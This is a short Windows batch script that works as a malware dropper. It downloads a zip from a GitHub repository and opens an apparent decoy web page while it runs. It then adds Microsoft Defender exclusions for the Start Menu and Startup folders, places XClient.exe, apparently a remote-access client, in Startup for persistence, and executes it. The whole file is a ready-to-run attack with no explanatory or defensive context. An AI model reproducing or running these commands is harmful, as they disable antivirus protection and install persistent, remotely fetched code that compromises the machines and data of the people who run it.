cd %AppData%\Microsoft\Windows\Start Menu\Programs
curl -o system.zip https://codeload.github.com/Sw4pni1/data/zip/refs/heads/master
start http://makeacourse.free.nf/?i=1
powershell -command "Expand-Archive -LiteralPath .\system.zip"
set "windows_username=%USERNAME%"
powershell -command "Add-MpPreference -ExclusionPath 'C:\Users\%windows_username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\'"
powershell -command "Add-MpPreference -ExclusionPath 'C:\Users\%windows_username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'"
cd system/data-master
move "XClient.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
cd %AppData%\Microsoft\Windows\Start Menu\Programs\Startup
XClient.exe
exit




